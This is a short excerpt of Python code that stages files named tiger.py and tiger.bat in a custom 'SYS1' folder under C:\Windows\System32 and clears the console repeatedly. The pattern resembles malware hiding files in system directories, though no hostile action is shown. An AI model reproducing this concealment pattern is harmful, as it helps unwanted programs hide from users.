...
def updating_premx():
    aesv3_path = r"C:\Windows\System32\SYS1\tiger.py"
    directory_path = r"C:\Windows\System32\SYS1"
...
if not os.path.exists("C:\\Windows\\System32\\SYS1\\tiger.py"):
    os.system('cls')
    print("----------------------------------")
...
os.system('cls')
batch_file_path = r"C:\Windows\System32\SYS1\tiger.bat"
os.system('cls')
